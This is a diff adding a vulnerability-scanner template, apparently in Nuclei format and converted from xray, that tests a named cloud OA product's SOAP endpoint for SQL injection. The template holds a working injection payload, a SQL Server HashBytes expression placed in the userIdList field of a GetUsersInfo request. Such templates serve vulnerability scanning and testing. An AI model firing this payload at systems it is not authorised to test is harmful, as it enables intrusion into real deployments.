@@ -1,0 +1,31 @@
+id: poc-yaml-cloud-oa-system-sqli
+
+info:
+  name: poc-yaml-cloud-oa-system-sqli
+  author: Aurora
+  severity: high
+  tags: xray-converted,sqli,ct-456760
+  reference:
+    - https://oa.24om.com/
+
+http:
+  - raw:
+      - |
+        POST /OA/PM/svc.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetUsersInfo xmlns="http://tempuri.org/">
+        <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{rand_int(1000, 9999)}}'),2))</userIdList>
+        </GetUsersInfo>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
